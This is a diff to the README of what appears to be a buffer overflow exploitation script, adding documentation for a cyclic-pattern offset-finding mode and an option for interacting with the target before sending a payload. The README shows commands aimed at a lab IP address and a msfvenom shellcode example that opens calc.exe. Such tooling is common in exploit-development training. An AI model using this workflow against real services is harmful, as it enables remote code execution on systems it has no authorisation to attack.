@@ -11,9 +11,14 @@ test - Sends simple string (AAAAA) with buffer size and buffer head for memory t
 ./ig-buffer-overflow.py -m test --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/'
 ```
 
-cyclic - Sends cyclic string to help identify memory positions
+cyclic - Sends cyclic pattern to help identify memory positions
 ```
 ./ig-buffer-overflow.py -m cyclic --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/'
+```
+
+checkoffset - Auxiliary mode for offset detection on pattern
+```
+./ig-buffer-overflow.py -m checkoffset --value=31704331 --length=5000
 ```
 
 write - Writes hex value to buffer offset
@@ -53,6 +58,10 @@ exploit - Sends malicious payload via buffer overflow
 * --shellcode	: Hex shell code file generated using msfvenom.
   * Example: msfvenom -p windows/exec cmd=calc.exe -b '\x00' -f hex EXITFUNC=thread -o opencalc
 * --nops		: Amount of nops to add before and after the shell code. Default is 0.
+* --value		: Offset value.
+* --length	: Cyclic pattern length.
+* --interact	: Interacts with the application before sending the payload. For each message in string (separated with ';;'), sends and receives response from app.
+  * Example: --interact='login;;user' --> Sends 'login', gets response, sends 'user', gets response, and finally sends the generated payload
 
 ## Vanilla Buffer Overflow example
 
